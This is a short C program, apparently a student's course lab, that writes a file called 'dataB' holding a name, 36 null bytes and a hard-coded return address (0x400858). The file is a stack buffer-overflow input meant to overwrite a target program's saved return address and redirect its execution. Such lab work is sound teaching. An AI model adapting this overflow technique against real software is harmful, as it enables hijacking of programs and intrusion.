/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Kok Wei Pua and Cherie Jiraphanphong                       */
/*--------------------------------------------------------------------*/

#include <stdio.h>

int main(void) {

    int i; 
    unsigned long ulAddr; /* Memory address variable */
    
    /* Create dataB file */
    FILE *psFile;
    psFile = fopen("dataB", "w");

    /* Write name to file */
    fprintf(psFile, "Chewei Puaji");

    /* Fill in null bytes to reach the end of buf array */
    for (i = 0; i < 36; i++) {
        putc('\0', psFile);
    }

    /* Write the return address */ 
    ulAddr = 0x400858;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    /* Close the file and return 0 */
    fclose(psFile); 
    return 0; 

}